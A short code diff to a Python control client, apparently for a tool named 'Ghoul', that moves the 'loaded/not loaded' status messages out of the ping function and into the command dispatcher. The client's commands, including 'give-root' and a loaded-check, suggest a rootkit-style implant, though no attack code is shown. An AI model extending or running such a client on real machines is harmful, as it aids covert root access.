@@ -63,10 +63,8 @@ def ping(arg: Optional[int] = None):
     
     res = service_request(SERVICE_PING, arg)
     if res == arg:
-        print('Ghoul is loaded')
         return True
     else:
-        print('Ghoul is not loaded')
         return False
 
 
@@ -160,7 +158,10 @@ if __name__ == '__main__':
     elif args.cmd == 'change-fd':
         change_fd(args.new_fd)
     elif args.cmd == 'ping':
-        ping(args.ping_arg)
+        if ping(args.ping_arg):
+            print('Ghoul is loaded')
+        else:
+            print('Ghoul is not loaded')
     elif args.cmd == 'change-ping-arg':
         change_ping_arg(args.new_ping_arg)
     elif args.cmd == 'give-root':
